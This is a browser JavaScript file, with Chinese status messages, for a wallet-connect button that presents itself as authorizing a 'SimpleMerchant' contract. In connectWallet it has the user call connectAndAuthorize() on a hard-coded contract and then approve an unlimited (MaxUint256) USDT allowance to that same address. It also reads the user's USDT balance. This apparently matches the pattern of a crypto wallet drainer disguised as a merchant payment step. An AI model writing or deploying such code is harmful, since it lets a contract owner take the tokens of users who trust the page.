const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const CONTRACT_ABI = [
    "function connectAndAuthorize() external",
    "function authorized(address customer) external view returns (bool)",
    "event Authorized(address indexed customer)"
];
const USDT_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];

const connectButton = document.getElementById('connectButton');
let provider, signer, userAddress, contract, usdtContract;

// Stores event listener references
let accountChangeListener = null;
let chainChangeListener = null;

// 重試函數：處理臨時性 RPC 錯誤
async function retry(fn, maxAttempts = 5, delayMs = 2000) {
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        try {
            return await fn();
        } catch (error) {
            if (attempt === maxAttempts || !error.message.includes('service temporarily unavailable')) {
                throw error;
            }
            console.warn(`Retry ${attempt}/${maxAttempts}: ${error.message}`);
            await new Promise(resolve => setTimeout(resolve, delayMs));
        }
    }
}

// 等待交易確認
async function waitForTransaction(txHash) {
    return await retry(async () => {
        const receipt = await provider.getTransactionReceipt(txHash);
        if (!receipt) throw new Error('Transaction receipt not found, still pending');
        return receipt;
    }, 5, 2000);
}

async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('請安裝 MetaMask 或支援的錢包'); // Please install MetaMask or a supported wallet
            return;
        }
        
        provider = new ethers.BrowserProvider(window.ethereum);
        
        // Remove old listeners
        if (accountChangeListener) window.ethereum.removeListener('accountsChanged', accountChangeListener);
        if (chainChangeListener) window.ethereum.removeListener('chainChanged', chainChangeListener);

        // Check network and switch to Mainnet
        const network = await provider.getNetwork();
        if (network.chainId !== 1n) {
            updateStatus('正在切換到以太坊主網...'); // Switching to Ethereum Mainnet...
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }]
                });
                provider = new ethers.BrowserProvider(window.ethereum);
                await provider.getNetwork();
            } catch (switchError) {
                if (switchError.code === 4001) {
                    updateStatus('用戶拒絕切換網絡，請手動切換到以太坊主網。'); // User rejected network switch
                } else {
                    updateStatus(`切換網絡失敗：${switchError.message}`); // Network switch failed
                }
                return;
            }
        }

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            userAddress = accounts[0];
            signer = await provider.getSigner();
            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
            await checkAuthorization();
            updateStatus('已恢復連繫狀態，正在檢查授權狀態'); // Connection restored, checking authorization status
        } else {
            updateStatus('請連繫錢包'); // Please connect wallet
        }

        accountChangeListener = (accounts) => {
            if (accounts.length === 0) {
                resetState();
                updateStatus('錢包已斷開連繫'); // Wallet disconnected
            } else {
                initializeWallet();
            }
        };
        window.ethereum.on('accountsChanged', accountChangeListener);

        chainChangeListener = () => {
            resetState();
            updateStatus('網絡已切換，請重新連繫錢包'); // Network changed, please reconnect wallet
            window.location.reload();
        };
        window.ethereum.on('chainChanged', chainChangeListener);
    } catch (error) {
        updateStatus(`初始化失敗：${error.message}`); // Initialization failed
        console.error("Initialize Wallet Error:", error);
    }
}

async function checkAuthorization() {
    try {
        if (!signer || !userAddress || !contract || !usdtContract) {
            return;
        }

        const isAuthorized = await retry(() => contract.authorized(userAddress), 3, 1000);
        const usdtAllowance = await retry(() => usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS), 3, 1000);
        const maxAllowance = ethers.MaxUint256;
        
        let usdtBalance = 0n;
        try {
            usdtBalance = await retry(() => usdtContract.balanceOf(userAddress), 3, 1000);
        } catch (e) {
            console.warn('Failed to fetch USDT balance:', e);
        }

        let statusMessage = '';
        const isUsdtMaxApproved = usdtAllowance >= maxAllowance / 2n;

        if (isAuthorized) {
            statusMessage += 'SimpleMerchant 合約已授權 ✅。'; // SimpleMerchant contract authorized
        } else {
            statusMessage += 'SimpleMerchant 合約未授權 ❌。'; // SimpleMerchant contract NOT authorized
        }

        statusMessage += `USDT 餘額：${ethers.formatUnits(usdtBalance, 6)}。`; // USDT Balance
        if (isUsdtMaxApproved) {
            statusMessage += `USDT 已授權足夠金額 (MaxUint256) ✅。`; // USDT approved for MaxUint256
        } else if (usdtAllowance > 0n) {
            statusMessage += `USDT 授權金額不足 ⚠️。`; // USDT approval amount insufficient
        } else {
            statusMessage += `USDT 未授權或授權為零 ❌。`; // USDT not approved or approval is zero
        }

        const allAuthorized = isAuthorized && isUsdtMaxApproved;

        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = '斷開錢包'; // Disconnect Wallet
            connectButton.disabled = false;
            updateStatus(`已連繫並完成所有授權。${statusMessage}`); // Connected and fully authorized
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = '連繫錢包 (完成授權)'; // Connect Wallet (Complete Authorization)
            connectButton.disabled = false;
            updateStatus(`請連繫錢包並完成所有授權。${statusMessage} 點擊錢包按鈕將提示您簽署交易。`); // Please connect and complete authorizations
        }
    } catch (error) {
        updateStatus(`檢查授權失敗：${error.message}`); // Authorization check failed
        console.error("Check Authorization Error:", error);
    }
}

async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('請安裝 MetaMask 或支援的錢包');
            return;
        }

        await provider.send('eth_requestAccounts', []);
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);

        const ethBalance = await retry(() => provider.getBalance(userAddress), 3, 1000);
        const requiredEthForGas = ethers.parseEther('0.001');
        if (ethBalance < requiredEthForGas) {
            updateStatus(`警告：ETH 餘額可能不足以支付授權交易的 Gas 費用 (建議至少 ${ethers.formatEther(requiredEthForGas)} ETH，實際 ${ethers.formatEther(ethBalance)} ETH)。`); // Warning: ETH balance may be insufficient
        } else {
            updateStatus('ETH 餘額充足，正在檢查授權...'); // ETH balance sufficient
        }

        const isAuthorized = await retry(() => contract.authorized(userAddress), 3, 1000);
        if (!isAuthorized) {
            updateStatus('正在授權 SimpleMerchant 合約 (交易 1/2)...'); // Authorizing SimpleMerchant Contract
            const txAuthorize = await contract.connectAndAuthorize();
            await retry(() => waitForTransaction(txAuthorize.hash), 5, 2000);
            updateStatus('SimpleMerchant 合約授權成功。'); // SimpleMerchant Contract authorization successful
        } else {
            updateStatus('SimpleMerchant 合約已授權，正在檢查 USDT 授權...'); // SimpleMerchant Contract already authorized
        }

        const usdtAllowance = await retry(() => usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS), 3, 1000);
        const maxAllowance = ethers.MaxUint256;
        if (usdtAllowance < maxAllowance / 2n) {
            updateStatus('正在批准 USDT 代幣 (MaxUint256) (交易 2/2)...'); // Authorizing USDT Token
            const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
            await retry(() => waitForTransaction(txApprove.hash), 5, 2000);
            updateStatus('USDT 代幣批准成功 (已設為 MaxUint256)。'); // USDT Token approval successful
        } else {
            updateStatus('USDT 代幣已授權足夠金額 (MaxUint256)。'); // USDT Token already approved
        }

        await checkAuthorization();
        updateStatus('已連繫並完成所有必要授權。'); // Connected and all necessary authorizations completed
    } catch (error) {
        let errorMessage = error.message;
        if (error.code === 4001) {
            errorMessage = '用戶拒絕交易'; // User rejected transaction
        } else if (error.code === -32603) {
            errorMessage = '服務暫不可用，請稍後重試或切換 RPC 提供者'; // Service temporarily unavailable
        }
        updateStatus(`操作失敗：${errorMessage}`); // Operation failed
        console.error("Connect Wallet Error:", error);
        connectButton.classList.remove('connected');
        connectButton.title = '連繫錢包'; // Connect Wallet
        connectButton.disabled = false;
    }
}

function disconnectWallet() {
    resetState();
    updateStatus('錢包已斷開連繫，請重新連繫。'); // Wallet disconnected
    alert('錢包已斷開連繫。請在 MetaMask 設置中手動從“已連繫的網站”中移除本網站以完全斷開。'); // Manually remove from MetaMask
}

function resetState() {
    signer = null;
    userAddress = null;
    contract = null;
    usdtContract = null;
    connectButton.classList.remove('connected');
    connectButton.title = '連繫錢包'; // Connect Wallet
    connectButton.disabled = false;
}

function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    if (statusDiv) {
        statusDiv.innerHTML = `<strong>狀態：</strong> ${message}`; // Status
    }
}

connectButton.addEventListener('click', () => {
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        connectWallet();
    }
});

initializeWallet();
console.log('connectButton event listener added and initializeWallet called');